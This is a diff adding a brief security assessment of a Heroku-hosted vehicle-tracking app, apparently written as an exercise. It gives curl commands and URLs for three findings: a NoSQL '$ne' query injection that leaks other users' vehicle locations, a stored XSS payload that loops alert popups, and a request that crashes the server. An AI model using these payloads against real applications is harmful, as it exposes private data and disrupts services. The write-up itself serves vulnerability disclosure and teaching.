@@ -1,0 +1,24 @@
+1. Peeking at private data
+Proof of concept:
+First put some vehicles in there
+curl --data "username=JANET" https://frozen-refuge-94340.herokuapp.com/submit 
+Then retrieve them using query 'username[$ne]='
+Visit https://frozen-refuge-94340.herokuapp.com/vehicle.json?username[$ne]=
+
+Why this happens:
+Equivalent to writing
+{ "username": { "$ne": undefined } }
+Potentially private data (i.e. the location of a random vehicle) leaked
+
+2. client-side XSS - annoying popups
+curl --data "username=<script>while(1){alert('hello');}</script>" https://frozen-refuge-94340.herokuapp.com/submit
+Then visit https://frozen-refuge-94340.herokuapp.com/
+
+3. Forced an application error
+Tried visiting
+https://frozen-refuge-94340.herokuapp.com/vehicle.json?username=
+Heroku app crashed: Error: Can't set headers after they are sent.
+
+Problem identified:
+node allows one method to send the http response per request - in this particular
+example, response.send() was called in three separate lines.
